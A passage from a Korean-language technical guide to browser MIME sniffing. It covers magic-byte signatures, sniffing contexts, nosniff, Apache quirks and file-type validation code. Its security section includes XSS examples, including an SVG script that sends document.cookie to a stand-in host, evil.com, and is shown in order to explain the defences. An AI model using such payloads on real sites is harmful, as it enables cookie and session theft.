참고: AVIF는 `image/avif` MIME 타입 자체는 정의되어 있지만, MIME Sniffing Standard의 매직 바이트 패턴 매칭 목록에는 포함되어 있지 않다(스니핑 대상이 아님).

오디오/비디오:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ MP3      │ 49 44 33                    │ ID3 (ID3 태그)     │
│          │ FF FB/F3/F2                │ (프레임 동기)       │
│ OGG      │ 4F 67 67 53 00             │ OggS + NUL         │
│ WAV      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 57 41 56 45                │ WAVE               │
│ FLAC     │ 66 4C 61 43                │ fLaC               │
│ MIDI     │ 4D 54 68 64                │ MThd               │
│ WebM     │ 1A 45 DF A3                │ (EBML 헤더)        │
│ MP4      │ xx xx xx xx 66 74 79 70    │ ....ftyp           │
│ AVI      │ 52 49 46 46 xx xx xx xx    │ RIFF....           │
│          │ 41 56 49 20                │ AVI.               │
└──────────┴─────────────────────────────┴────────────────────┘

폰트:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ WOFF     │ 77 4F 46 46                │ wOFF               │
│ WOFF2    │ 77 4F 46 32                │ wOF2               │
│ TrueType │ 00 01 00 00                │ ....               │
│ OpenType │ 4F 54 54 4F                │ OTTO               │
│ Collection│ 74 74 63 66               │ ttcf               │
└──────────┴─────────────────────────────┴────────────────────┘

아카이브:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ ZIP      │ 50 4B 03 04                │ PK..               │
│ GZIP     │ 1F 8B                      │ ..                 │
│ RAR      │ 52 61 72 20 1A 07          │ Rar ..             │
└──────────┴─────────────────────────────┴────────────────────┘

문서:
┌─────────────────────────────────────────────────────────────┐
│ 포맷     │ 매직 바이트 (Hex)           │ 설명               │
├──────────┼─────────────────────────────┼────────────────────┤
│ PDF      │ 25 50 44 46                │ %PDF               │
│ PostScript│ 25 21                      │ %!                 │
└──────────┴─────────────────────────────┴────────────────────┘
```

#### 7.2 HTML 스니핑 패턴

```
[HTML 스니핑 바이트 패턴]

다음 바이트 시퀀스 중 하나와 매칭되면 text/html:

1. <!DOCTYPE (대소문자 무시)
   → 바이트: 3C 21 44 4F 43 54 59 50 45
              <  !  D  O  C  T  Y  P  E

2. <html (뒤에 공백 또는 >)
   → 바이트: 3C 68 74 6D 6C (+ 공백/태그 종료)

3. <head (뒤에 공백 또는 >)
   → 바이트: 3C 68 65 61 64

4. <script (뒤에 공백 또는 >)
   → 바이트: 3C 73 63 72 69 70 74

5. <iframe (뒤에 공백 또는 >)
   → 바이트: 3C 69 66 72 61 6D 65

6. <h1 (뒤에 공백 또는 >)
   → 바이트: 3C 68 31

7. <div (뒤에 공백 또는 >)
   → 바이트: 3C 64 69 76

8. <font (뒤에 공백 또는 >)
   → 바이트: 3C 66 6F 6E 74

9. <table (뒤에 공백 또는 >)
   → 바이트: 3C 74 61 62 6C 65

10. <a (뒤에 공백 또는 >)
    → 바이트: 3C 61

11. <style (뒤에 공백 또는 >)
    → 바이트: 3C 73 74 79 6C 65

12. <title (뒤에 공백 또는 >)
    → 바이트: 3C 74 69 74 6C 65

13. <b (뒤에 공백 또는 >)
    → 바이트: 3C 62

14. <body (뒤에 공백 또는 >)
    → 바이트: 3C 62 6F 64 79

15. <br (뒤에 공백 또는 >)
    → 바이트: 3C 62 72

16. <p (뒤에 공백 또는 >)
    → 바이트: 3C 70

17. <!-- (HTML 주석)
    → 바이트: 3C 21 2D 2D
```

#### 7.3 텍스트/바이너리 판별

```
[텍스트 vs 바이너리 판별 알고리즘]

리소스의 처음 N 바이트를 검사:

바이너리 데이터로 판별하는 바이트값:
- 0x00 ~ 0x08 (C0 제어 문자)
- 0x0B (VT)
- 0x0E ~ 0x1A (C0 제어 문자)
- 0x1C ~ 0x1F (C0 제어 문자)

예외 (바이너리가 아닌 것으로 판별):
- 0x09 (탭)
- 0x0A (줄바꿈, LF)
- 0x0C (폼 피드)
- 0x0D (캐리지 리턴, CR)
- 0x1B (ESC)
- 0x7F (DEL, 스펙상 바이너리 바이트에 포함되지 않음)

위의 "바이너리 바이트"가 하나도 없으면 → text/plain
하나라도 있으면 → application/octet-stream
```

#### 7.4 JavaScript에서의 매직 바이트 감지

```javascript
// 매직 바이트로 파일 타입 감지
function detectFileType(buffer) {
    const bytes = new Uint8Array(buffer);

    // PNG: 89 50 4E 47 0D 0A 1A 0A
    if (bytes[0] === 0x89 && bytes[1] === 0x50 &&
        bytes[2] === 0x4E && bytes[3] === 0x47 &&
        bytes[4] === 0x0D && bytes[5] === 0x0A &&
        bytes[6] === 0x1A && bytes[7] === 0x0A) {
        return 'image/png';
    }

    // JPEG: FF D8 FF
    if (bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
        return 'image/jpeg';
    }

    // GIF: 47 49 46 38 (GIF8)
    if (bytes[0] === 0x47 && bytes[1] === 0x49 &&
        bytes[2] === 0x46 && bytes[3] === 0x38) {
        return 'image/gif';
    }

    // BMP: 42 4D
    if (bytes[0] === 0x42 && bytes[1] === 0x4D) {
        return 'image/bmp';
    }

    // WebP: RIFF....WEBPVP
    if (bytes[0] === 0x52 && bytes[1] === 0x49 &&
        bytes[2] === 0x46 && bytes[3] === 0x46 &&
        bytes[8] === 0x57 && bytes[9] === 0x45 &&
        bytes[10] === 0x42 && bytes[11] === 0x50 &&
        bytes[12] === 0x56 && bytes[13] === 0x50) {
        return 'image/webp';
    }

    // PDF: %PDF
    if (bytes[0] === 0x25 && bytes[1] === 0x50 &&
        bytes[2] === 0x44 && bytes[3] === 0x46) {
        return 'application/pdf';
    }

    // ZIP: PK
    if (bytes[0] === 0x50 && bytes[1] === 0x4B &&
        bytes[2] === 0x03 && bytes[3] === 0x04) {
        return 'application/zip';
    }

    // GZIP: 1F 8B
    if (bytes[0] === 0x1F && bytes[1] === 0x8B) {
        return 'application/x-gzip';
    }

    // WOFF: wOFF
    if (bytes[0] === 0x77 && bytes[1] === 0x4F &&
        bytes[2] === 0x46 && bytes[3] === 0x46) {
        return 'font/woff';
    }

    // WOFF2: wOF2
    if (bytes[0] === 0x77 && bytes[1] === 0x4F &&
        bytes[2] === 0x46 && bytes[3] === 0x32) {
        return 'font/woff2';
    }

    // MP3: ID3
    if (bytes[0] === 0x49 && bytes[1] === 0x44 && bytes[2] === 0x33) {
        return 'audio/mpeg';
    }

    // OGG: OggS + NUL
    if (bytes[0] === 0x4F && bytes[1] === 0x67 &&
        bytes[2] === 0x67 && bytes[3] === 0x53 &&
        bytes[4] === 0x00) {
        return 'audio/ogg';
    }

    // 텍스트/바이너리 판별
    if (isTextContent(bytes)) {
        return 'text/plain';
    }

    return 'application/octet-stream';
}

function isTextContent(bytes) {
    const binaryBytes = new Set([
        ...range(0x00, 0x08),
        0x0B,
        ...range(0x0E, 0x1A),
        ...range(0x1C, 0x1F)
    ]);

    const checkLength = Math.min(bytes.length, 512);
    for (let i = 0; i < checkLength; i++) {
        if (binaryBytes.has(bytes[i])) {
            return false;
        }
    }
    return true;
}

function range(start, end) {
    const result = [];
    for (let i = start; i <= end; i++) {
        result.push(i);
    }
    return result;
}

// 사용 예시
async function checkFileType(file) {
    const buffer = await file.slice(0, 16).arrayBuffer();
    const type = detectFileType(buffer);
    console.log(`파일: ${file.name}, 감지된 타입: ${type}`);
    console.log(`파일이 제공한 타입: ${file.type}`);
    return type;
}
```

---

### 8. Sniffing Context

#### 8.1 컨텍스트별 스니핑 동작

MIME 스니핑의 동작은 리소스가 사용되는 컨텍스트에 따라 달라진다.

| 컨텍스트 | 설명 | 스니핑 대상 |
|----------|------|------------|
| browsing context | 페이지 내비게이션 | HTML, XML, 이미지, 미디어, PDF 등 |
| image | `<img>`, CSS `background-image` | 이미지 타입만 |
| audio/video | `<audio>`, `<video>` | 오디오/비디오 타입만 |
| plugin | `<embed>`, `<object>` | 플러그인 타입 |
| style | `<link rel="stylesheet">` | CSS |
| script | `<script>` | JavaScript |
| font | `@font-face` | 폰트 타입 |
| text track | `<track>` | WebVTT |
| cache manifest | 매니페스트 | text/cache-manifest |

#### 8.2 Browsing Context 스니핑

```
[Browsing Context 스니핑 알고리즘]

1. nosniff가 설정되어 있으면
   └── supplied type 그대로 사용

2. supplied type이 없으면
   └── Unknown Type 스니핑 수행
       (이미지 → 미디어 → 아카이브 → 텍스트/바이너리)

3. supplied type이 있으면:
   ├── text/html → HTML로 처리
   ├── text/plain → 텍스트로 처리 (바이트 검사 후 HTML 아닌지 확인)
   ├── application/octet-stream → Unknown Type 스니핑
   ├── 이미지 타입 → 이미지로 처리
   ├── 미디어 타입 → 미디어로 처리
   └── 기타 → supplied type 그대로 사용
```

#### 8.3 Image Context 스니핑

```
[Image Context 스니핑 알고리즘]

1. supplied type이 이미지 MIME 타입이면
   └── supplied type 그대로 사용

2. supplied type이 없거나 이미지가 아니면
   └── 이미지 매직 바이트 패턴 매칭:
       ├── PNG 패턴 → image/png
       ├── JPEG 패턴 → image/jpeg
       ├── GIF 패턴 → image/gif
       ├── BMP 패턴 → image/bmp
       ├── WebP 패턴 → image/webp
       ├── ICO 패턴 → image/x-icon
       └── 매칭 없음 → supplied type 또는 application/octet-stream
```

#### 8.4 Script Context 스니핑

```
[Script Context 스니핑]

nosniff가 설정된 경우:
  supplied type이 JavaScript MIME 타입이 아니면 → 스크립트 실행 차단!
  이것이 nosniff의 가장 중요한 보안 기능

nosniff가 없는 경우:
  supplied type이 없거나 비표준이어도
  바이트 패턴이 JavaScript처럼 보이면 실행될 수 있음
```

#### 8.5 Style Context 스니핑

```
[Style Context 스니핑]

nosniff가 설정된 경우:
  supplied type이 text/css가 아니면 → 스타일시트 적용 차단!

nosniff가 없는 경우:
  supplied type이 없거나 잘못되어도
  text/css로 처리될 수 있음
```

---

### 9. 보안 고려사항

#### 9.1 X-Content-Type-Options: nosniff

```
[nosniff 헤더]

HTTP 응답 헤더:
X-Content-Type-Options: nosniff

효과:
├── 브라우저의 MIME 스니핑을 비활성화
├── supplied type(Content-Type)을 그대로 사용하도록 강제
└── 스크립트/스타일 컨텍스트에서 MIME 타입 불일치 시 차단

보안 이점:
├── XSS 공격 방지 (HTML 스니핑 방지)
├── MIME confusion 공격 방지
└── Content-Type 기반의 정확한 처리 보장
```

```
[nosniff 동작 예시]

시나리오: 악의적인 파일 업로드
  파일 이름: evil.jpg
  파일 내용: <script>alert('XSS')</script>
  Content-Type: image/jpeg

nosniff 없을 때:
  브라우저가 바이트를 검사 → HTML 태그 발견
  → text/html로 스니핑 → 스크립트 실행!!! (XSS)

nosniff 있을 때 (X-Content-Type-Options: nosniff):
  브라우저가 Content-Type: image/jpeg 그대로 사용
  → 이미지로 처리 시도 → 유효하지 않은 이미지 → 에러
  → 스크립트 실행되지 않음 (안전)
```

#### 9.2 MIME Confusion 공격

```
[MIME Confusion 공격 시나리오]

1. 공격자가 게시판에 파일 업로드
   - 파일명: document.pdf
   - 실제 내용: <html><script>steal_cookies()</script></html>

2. 서버가 파일을 application/pdf로 제공

3. 브라우저가 MIME 스니핑 수행:
   - 바이트 패턴이 PDF가 아님
   - HTML 태그 발견
   - text/html로 스니핑 → 스크립트 실행!

4. 방어: X-Content-Type-Options: nosniff
   - application/pdf 그대로 처리
   - HTML로 스니핑되지 않음
```

#### 9.3 보안 권장사항

```
서버 측 보안 설정:

1. 항상 정확한 Content-Type 설정
   ✓ Content-Type: text/html; charset=utf-8
   ✓ Content-Type: application/json
   ✓ Content-Type: image/png

2. nosniff 헤더 추가
   ✓ X-Content-Type-Options: nosniff

3. 사용자 업로드 파일 검증
   ✓ 서버에서 매직 바이트 확인
   ✓ Content-Type과 실제 내용 일치 확인
   ✓ HTML/JavaScript 내용 포함 여부 확인

4. Content-Disposition 헤더 활용
   ✓ Content-Disposition: attachment; filename="file.pdf"
   (다운로드 강제로 브라우저 렌더링 방지)
```

```javascript
// 서버 측: Express.js 보안 설정 예시
const express = require('express');
const helmet = require('helmet');

const app = express();

// helmet이 X-Content-Type-Options: nosniff를 자동 추가
app.use(helmet());

// 또는 수동 설정
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});

// 파일 업로드 시 MIME 타입 검증
const fileUpload = require('express-fileupload');
const fileType = require('file-type');

app.post('/upload', async (req, res) => {
    const file = req.files.myFile;

    // 매직 바이트로 실제 타입 확인
    const detected = await fileType.fromBuffer(file.data);

    if (!detected || !allowedTypes.includes(detected.mime)) {
        return res.status(400).json({ error: '허용되지 않는 파일 형식입니다.' });
    }

    // Content-Type과 실제 타입 비교
    if (file.mimetype !== detected.mime) {
        console.warn('MIME 타입 불일치:', file.mimetype, '!=', detected.mime);
    }

    // 안전한 Content-Type으로 저장/제공
    // ...
});
```

#### 9.4 SVG의 보안 위험

```
[SVG MIME 스니핑의 보안 문제]

SVG (image/svg+xml)는 XML 기반이므로:
- <script> 태그 포함 가능
- JavaScript 실행 가능
- 외부 리소스 로드 가능
- CSS를 통한 데이터 유출 가능

공격 예시:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // 쿠키 탈취
    new Image().src = 'https://evil.com/?c=' + document.cookie;
  </script>
</svg>

방어:
├── SVG를 <img>로만 사용 (스크립트 실행 불가)
├── Content-Security-Policy 설정
├── SVG 업로드 시 서버에서 스크립트 태그 제거
└── 별도 도메인에서 SVG 제공 (sandbox)
```

---

### 10. Apache Bug 호환성

#### 10.1 Apache Content-Type Bug

Apache 웹 서버의 구버전에서 발생하는 유명한 버그로, `Content-Type` 헤더에 잘못된 값을 설정하는 문제이다.

```
[Apache Bug 설명]

문제:
Apache가 일부 파일에 대해 Content-Type을 잘못 설정:
  Content-Type: text/plain; charset=iso-8859-1

이 헤더가 실제로는:
  - text/html인 파일에 text/plain을 설정
  - 이미지 파일에 text/plain을 설정
  - 기타 바이너리 파일에 text/plain을 설정

원인:
  Apache의 기본 설정에서 인식하지 못하는 확장자의 파일에
  text/plain을 기본값으로 할당
```

#### 10.2 Apache Bug 대응

```
[MIME Sniffing Standard의 Apache Bug 대응]

supplied type이 다음인 경우 특별 처리:
  - text/plain
  - text/plain; charset=ISO-8859-1
  - text/plain; charset=iso-8859-1
  - text/plain; charset=UTF-8

이 경우 브라우저는 바이트 스니핑을 수행하여
실제 콘텐츠 타입을 결정할 수 있음

이유:
  Apache 버그로 인해 많은 리소스가 잘못된 text/plain으로 제공됨
  사용자 경험을 위해 실제 타입을 감지할 필요가 있음
```

#### 10.3 현대 Apache 설정

```apache
# Apache에서 올바른 MIME 타입 설정

# mime.conf 또는 .htaccess
AddType text/html .html .htm
AddType text/css .css
AddType text/javascript .js .mjs
AddType application/json .json
AddType image/png .png
AddType image/jpeg .jpg .jpeg
AddType image/gif .gif
AddType image/svg+xml .svg .svgz
AddType image/webp .webp
AddType font/woff .woff
AddType font/woff2 .woff2
AddType application/pdf .pdf
AddType video/mp4 .mp4
AddType video/webm .webm

# nosniff 헤더 추가
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options "nosniff"
</IfModule>

# 기본 MIME 타입 설정 (인식하지 못하는 확장자)
DefaultType application/octet-stream
```

---

### 11. 실용 예제

#### 11.1 파일 업로드 타입 검증

```javascript
// 클라이언트 측 파일 타입 검증 (매직 바이트 기반)
class FileTypeValidator {
    constructor() {
        this.signatures = [
            // [offset, bytes, mime]
            { offset: 0, bytes: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], mime: 'image/png' },
            { offset: 0, bytes: [0xFF, 0xD8, 0xFF], mime: 'image/jpeg' },
            { offset: 0, bytes: [0x47, 0x49, 0x46, 0x38], mime: 'image/gif' },
            { offset: 0, bytes: [0x42, 0x4D], mime: 'image/bmp' },
            { offset: 0, bytes: [0x25, 0x50, 0x44, 0x46], mime: 'application/pdf' },
            { offset: 0, bytes: [0x50, 0x4B, 0x03, 0x04], mime: 'application/zip' },
            { offset: 0, bytes: [0x77, 0x4F, 0x46, 0x46], mime: 'font/woff' },
            { offset: 0, bytes: [0x77, 0x4F, 0x46, 0x32], mime: 'font/woff2' },
        ];

        // 복합 시그니처 (여러 위치 확인 필요)
        this.complexSignatures = [
            {
                checks: [
                    { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46] },
                    { offset: 8, bytes: [0x57, 0x45, 0x42, 0x50, 0x56, 0x50] }
                ],
                mime: 'image/webp'
            },
            {
                checks: [
                    { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46] },
                    { offset: 8, bytes: [0x57, 0x41, 0x56, 0x45] }
                ],
                mime: 'audio/wav'
            }
        ];
    }

    async validate(file, allowedTypes) {
        const detectedType = await this.detect(file);

        const result = {
            file: file.name,
            fileType: file.type,          // 브라우저가 제공하는 타입
            detectedType: detectedType,    // 매직 바이트로 감지한 타입
            mismatch: file.type !== detectedType,
            allowed: allowedTypes.includes(detectedType)
        };

        if (result.mismatch) {
            console.warn(
                `MIME 타입 불일치: ${file.name} - ` +
                `브라우저: ${file.type}, 감지: ${detectedType}`
            );
        }

        return result;
    }

    async detect(file) {
        const buffer = await file.slice(0, 32).arrayBuffer();
        const bytes = new Uint8Array(buffer);

        // 단순 시그니처 확인
        for (const sig of this.signatures) {
            if (this.matchBytes(bytes, sig.offset, sig.bytes)) {
                return sig.mime;
            }
        }

        // 복합 시그니처 확인
        for (const sig of this.complexSignatures) {
            const allMatch = sig.checks.every(check =>
                this.matchBytes(bytes, check.offset, check.bytes)
            );
            if (allMatch) return sig.mime;
        }

        return 'application/octet-stream';
    }

    matchBytes(data, offset, expected) {
        if (data.length < offset + expected.length) return false;
        return expected.every((byte, i) => data[offset + i] === byte);
    }
}

// 사용 예시
const validator = new FileTypeValidator();
const allowedImages = ['image/png', 'image/jpeg', 'image/gif', 'image/webp'];

document.getElementById('fileInput').addEventListener('change', async (event) => {
    const file = event.target.files[0];
    if (!file) return;

    const result = await validator.validate(file, allowedImages);
    console.log('검증 결과:', result);

    if (!result.allowed) {
        alert(`허용되지 않는 파일 형식입니다. (감지된 타입: ${result.detectedType})`);
        event.target.value = '';
    }
});
```

#### 11.2 서버 측 Content-Type 설정

```javascript
// Node.js Express 서버에서의 올바른 Content-Type 설정
const express = require('express');
const path = require('path');

const app = express();

// MIME 타입 매핑
const mimeTypes = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'text/javascript; charset=utf-8',
    '.mjs': 'text/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml; charset=utf-8',
    '.webp': 'image/webp',
    '.avif': 'image/avif',
    '.ico': 'image/x-icon',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
    '.otf': 'font/otf',
    '.pdf': 'application/pdf',
    '.mp4': 'video/mp4',
    '.webm': 'video/webm',
    '.mp3': 'audio/mpeg',
    '.ogg': 'audio/ogg',
    '.wav': 'audio/wav',
    '.wasm': 'application/wasm',
    '.xml': 'application/xml; charset=utf-8',
    '.zip': 'application/zip',
    '.gz': 'application/gzip',
    '.map': 'application/json'
};

// 정적 파일 제공 시 올바른 Content-Type 설정
app.use(express.static('public', {
    setHeaders: (res, filePath) => {
        const ext = path.extname(filePath).toLowerCase();
        const contentType = mimeTypes[ext];

        if (contentType) {
            res.setHeader('Content-Type', contentType);
        }

        // 보안 헤더
        res.setHeader('X-Content-Type-Options', 'nosniff');
    }
}));
```

#### 11.3 Fetch API에서의 MIME 타입 확인

```javascript
// Fetch 응답의 MIME 타입 확인 및 처리
async function fetchWithTypeCheck(url, expectedType) {
    const response = await fetch(url);

    // Content-Type 확인
    const contentType = response.headers.get('Content-Type');
    console.log('서버 Content-Type:', contentType);

    // MIME 타입 파싱
    const mimeType = contentType ? contentType.split(';')[0].trim() : null;

    // 예상 타입과 비교
    if (expectedType && mimeType !== expectedType) {
        console.warn(`MIME 타입 불일치: 예상=${expectedType}, 실제=${mimeType}`);
    }

    // nosniff 확인
    const nosniff = response.headers.get('X-Content-Type-Options');
    if (nosniff === 'nosniff') {
        console.log('nosniff 헤더 존재: MIME 스니핑 비활성화');
    } else {
        console.warn('nosniff 헤더 없음: MIME 스니핑 가능');
    }

    return response;
}

// 사용 예시
const response = await fetchWithTypeCheck('/api/data', 'application/json');
```

---

### 12. 브라우저별 동작

#### 12.1 스니핑 동작 차이

| 동작 | Chrome | Firefox | Safari | Edge |
|------|--------|---------|--------|------|
| HTML 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 이미지 스니핑 | 지원 | 지원 | 지원 | 지원 |
| nosniff 지원 | 지원 | 지원 | 지원 | 지원 |
| text/plain 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 오디오/비디오 스니핑 | 지원 | 지원 | 지원 | 지원 |
| 폰트 스니핑 | 지원 | 지원 | 지원 | 지원 |
| JSON 스니핑 | 제한적 | 제한적 | 제한적 | 제한적 |

#### 12.2 nosniff 엄격도

```
[nosniff 적용 범위]

Chrome/Edge (Chromium):
├── script 컨텍스트: 엄격 (비JS MIME 차단)
├── style 컨텍스트: 엄격 (비CSS MIME 차단)
├── image 컨텍스트: 경고
├── font 컨텍스트: 경고/차단
└── browsing context: 적용 안 됨

Firefox:
├── script 컨텍스트: 엄격
├── style 컨텍스트: 엄격
├── image 컨텍스트: 경고
└── browsing context: 적용 안 됨

Safari:
├── script 컨텍스트: 부분 적용
├── style 컨텍스트: 부분 적용
└── 다른 컨텍스트: 제한적
```

---

### 13. 참고 자료

- [MIME Sniffing Standard (WHATWG)](https://mimesniff.spec.whatwg.org/)
- [MDN - MIME types](https://developer.mozilla.org/ko/docs/Web/HTTP/Basics_of_HTTP/MIME_types)
- [MDN - X-Content-Type-Options](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Content-Type-Options)
- [IANA Media Types](https://www.iana.org/assignments/media-types/media-types.xhtml)
- [RFC 2045 - MIME Part One: Format of Internet Message Bodies](https://tools.ietf.org/html/rfc2045)
- [RFC 6838 - Media Type Specifications and Registration Procedures](https://tools.ietf.org/html/rfc6838)
- [file-type (npm package)](https://github.com/sindresorhus/file-type)
